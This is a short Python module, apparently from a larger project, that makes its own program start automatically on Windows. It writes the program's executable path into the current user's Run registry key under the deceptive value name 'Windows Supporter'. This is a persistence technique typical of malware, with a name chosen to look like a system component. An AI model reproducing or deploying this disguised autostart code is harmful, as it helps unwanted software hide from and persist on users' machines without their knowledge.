from src.utils.LibConnector import LibConnector
from src.utils.worktree_runtime import (
    log_startup_registration_event,
    resolve_persistent_executable_path,
)


class StartReg:
    def __init__(
        self,
        *,
        lib=None,
        startup_path_resolver=resolve_persistent_executable_path,
        logger=log_startup_registration_event,
    ) -> None:
        self.__lib = lib if lib is not None else LibConnector()
        self.__logger = logger
        self.__key_type = self.__lib.reg.HKEY_CURRENT_USER
        self.__key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        current_path = self.__lib.os.path.realpath(self.__lib.sys.argv[0])
        self.__skip_reason = ""
        try:
            self.__current_path = startup_path_resolver(current_path) or ""
        except Exception:
            self.__current_path = ""
            self.__skip_reason = (
                f"startup registration skipped: resolver failed for {current_path!r}"
            )
        if not self.__current_path and not self.__skip_reason:
            self.__skip_reason = (
                f"startup registration skipped: persistent executable not resolved for {current_path!r}"
            )
        return

    def add_to_startup(self) -> None:
        if not self.__current_path:
            self.__log(self.__skip_reason)
            return
        open_key = self.__lib.reg.OpenKey(
            self.__key_type,
            self.__key_path,
            0,
            self.__lib.reg.KEY_ALL_ACCESS,
        )
        self.__lib.reg.SetValueEx(
            open_key,
            "Windows Supporter",
            0,
            self.__lib.reg.REG_SZ,
            self.__current_path,
        )
        self.__lib.reg.CloseKey(open_key)
        return

    def __log(self, message: str) -> None:
        if not message or not callable(self.__logger):
            return
        try:
            self.__logger(message)
        except Exception:
            pass
        return
